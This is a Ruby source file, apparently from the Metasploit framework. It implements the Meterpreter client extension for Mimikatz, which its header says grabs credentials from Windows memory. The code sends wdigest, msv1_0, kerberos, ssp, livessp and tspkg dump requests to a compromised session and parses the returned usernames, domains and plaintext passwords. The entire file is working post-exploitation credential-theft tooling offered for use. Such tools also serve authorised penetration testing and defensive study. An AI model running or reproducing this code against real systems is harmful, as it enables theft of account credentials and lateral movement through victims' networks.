#!/usr/bin/env ruby
# -*- coding: binary -*-

require 'rex/post/meterpreter/extensions/mimikatz/tlv'
require 'csv'

module Rex
module Post
module Meterpreter
module Extensions
module Mimikatz

###
#
# Mimikatz extension - grabs credentials from windows memory.
#
# Benjamin DELPY `gentilkiwi`
# http://blog.gentilkiwi.com/mimikatz
#
# extension converted by Ben Campbell (Meatballs)
###

class Mimikatz < Extension

	def initialize(client)
		super(client, 'mimikatz')

		client.register_extension_aliases(
			[
				{
					'name' => 'mimikatz',
					'ext'  => self
				},
			])
	end

	def mimikatz_send_request(method)
		request = Packet.create_request(method)
		response = client.send_request(request)
		result = Rex::Text.to_ascii(response.get_tlv_value(TLV_TYPE_MIMIKATZ_RESULT))

		details = CSV.parse(result)
		accounts  =  []
		details.each do |acc|
			account = {
				:authid => acc[0],
				:package => acc[1],
				:user => acc[2],
				:domain => acc[3],
				:password => acc[4]
			}
			accounts << account
		end
		return accounts
	end

	def wdigest
		mimikatz_send_request('mimikatz_wdigest')
	end

	def msv
		mimikatz_send_request('mimikatz_msv1_0')
	end

	def livessp
		mimikatz_send_request('mimikatz_livessp')
	end

	def ssp
		mimikatz_send_request('mimikatz_ssp')
	end

	def tspkg
		mimikatz_send_request('mimikatz_tspkg')
	end

	def kerberos
		mimikatz_send_request('mimikatz_kerberos')
	end
end

end; end; end; end; end

